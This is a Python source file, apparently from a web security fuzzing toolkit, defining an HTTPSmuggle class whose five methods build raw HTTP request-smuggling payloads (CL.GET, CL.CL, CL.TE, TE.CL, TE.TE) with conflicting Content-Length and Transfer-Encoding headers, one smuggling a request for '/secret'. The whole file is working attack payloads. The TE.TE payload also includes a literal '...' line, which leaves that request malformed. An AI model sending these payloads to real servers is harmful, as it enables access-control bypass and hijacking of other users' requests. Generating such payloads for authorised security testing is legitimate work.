#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class HTTPSmuggle(Fuzzer):

    """HTTPSmuggle"""

    def __init__(self):
        super(HTTPSmuggle, self).__init__()

    def CLGET(self, host="example.com"):
        payload = [
            "GET / HTTP/1.1\r\n",
            "Host: %s\r\n" % host,
            "Content-Length: 44\r\n",
            "\r\n",
            "GET /secret HTTP/1.1\r\n",
            "Host: %s\r\n" % host,
            "\r\n",
        ]
        return ''.join(payload)

    def CLCL(self, host="example.com"):
        payload = [
            "POST / HTTP/1.1\r\n",
            "Host: %s\r\n" % host,
            "Content-Length: 8\r\n",
            "Content-Length: 7\r\n",
            "\r\n",
            "12345\r\n",
            "a",
        ]
        return ''.join(payload)

    def CLTE(self, host="example.com"):
        payload = [
            "POST / HTTP/1.1\r\n",
            "Host: %s\r\n" % host,
            "Connection: keep-alive\r\n",
            "Content-Length: 6\r\n",
            "Transfer-Encoding: chunked\r\n",
            "\r\n",
            "0\r\n",
            "\r\n",
            "a",
        ]
        return ''.join(payload)

    def TECL(self, host="example.com"):
        payload = [
            "POST / HTTP/1.1\r\n",
            "Host: %s\r\n" % host,
            "Content-Length: 4\r\n",
            "Transfer-Encoding: chunked\r\n",
            "\r\n",
            "12\r\n",
            "aPOST / HTTP/1.1\r\n",
            "\r\n",
            "0\r\n",
            "\r\n",
        ]
        return ''.join(payload)

    def TETE(self, host="example.com"):
        payload = [
            "POST / HTTP/1.1\r\n",
            "Host: %s\r\n" % host,
            "...",
            "Content-length: 4\r\n",
            "Transfer-Encoding: chunked\r\n",
            "Transfer-encoding: cow\r\n",
            "\r\n",
            "5c\r\n",
            "aPOST / HTTP/1.1\r\n",
            "Content-Type: application/x-www-form-urlencoded\r\n",
            "Content-Length: 15\r\n",
            "\r\n",
            "x=1\r\n",
            "0\r\n",
            "\r\n",
        ]
        return ''.join(payload)
